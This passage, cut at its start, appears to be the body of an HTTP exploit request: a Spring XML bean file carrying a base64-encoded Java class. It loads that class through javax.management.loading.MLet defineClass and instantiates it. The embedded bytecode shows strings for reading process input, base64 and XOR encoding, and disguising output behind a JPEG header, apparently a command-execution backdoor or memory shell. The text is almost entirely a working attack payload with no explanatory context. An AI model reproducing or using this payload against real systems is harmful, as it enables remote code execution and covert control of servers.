Z2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAuAC5CgC3ALoBABFqYXZhL3V0aWwvU2Nhbm5lcgcAvAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwABQC+CgC9AL8BAAJcYQgAwQEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwwAwwDECgC9AMUBAAAIAMcBAAdoYXNOZXh0AQADKClaDADJAMoKAL0AywEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwDNCgDOAAkBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsMANAA0QoAzgDSAQAEbmV4dAwA1AAPCgC9ANUBAAh0b1N0cmluZwwA1wAPCgDOANgBAApnZXRNZXNzYWdlDADaAA8KAAgA2wEAE1tMamF2YS9sYW5nL1N0cmluZzsHAN0BABNqYXZhL2lvL0lucHV0U3RyZWFtBwDfAQAGZXlKZVhBCADhAQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgwA4wDkCgA0AOUBAAZsZW5ndGgMAOcAaQoANADoAQAGY2hhckF0AQAEKEkpQwwA6gDrCgA0AOwBABUoQylMamF2YS9sYW5nL1N0cmluZzsMAHkA7goANADvAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAPEA8goAdADzAQABLggA9QEAB2luZGV4T2YMAPcA8goANAD4AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwwA+gD7CgA0APwBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAD+AP8KAAIBAAEAAXgBAAYoW0IpW0IMAQIBAwoAAgEEAQAFKFtCKVYMAAUBBgoANAEHAQAGLzlqLzRBCAEJDACYAIsKAAIBCwEACGdldEJ5dGVzAQAEKClbQgwBDQEOCgA0AQ8BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7DAERARIKAAIBEwEABS85az09CAEVAQAWc3VuLm1pc2Mu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</value>

            </list>

        </property>

    </bean>

    <bean id="classLoader" class="javax.management.loading.MLet"/>
    <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
        <constructor-arg ref="decoder"/>
        <constructor-arg type="int" value="0"/>
        <constructor-arg type="int" value="5119"/>
    </bean>

    <bean factory-bean="clazz" factory-method="newInstance"/>
</beans>
--4ad051cf61a54e2a9831a1e30b9dcc31--
```

